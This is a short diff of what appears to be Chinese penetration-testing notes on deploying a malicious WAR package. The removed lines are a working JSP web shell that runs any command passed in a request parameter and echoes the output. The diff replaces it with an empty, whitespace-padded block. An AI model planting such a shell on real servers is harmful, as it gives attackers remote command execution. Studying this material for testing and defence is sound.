@@ -1213,11 +1213,7 @@ _部署War包_
 # 生成恶意War包
 # cmd.jsp
 <%@ page import="java.util.*,java.io.*"%>
-<% String cmd = request.getParameter("cmd");
-Process p = Runtime.getRuntime().exec(cmd);
-BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
-String line;
-while((line = br.readLine()) != null) { out.println(line); }
+<%                                                                                                                                                                                                                                                       
 %>
 
 # 打包
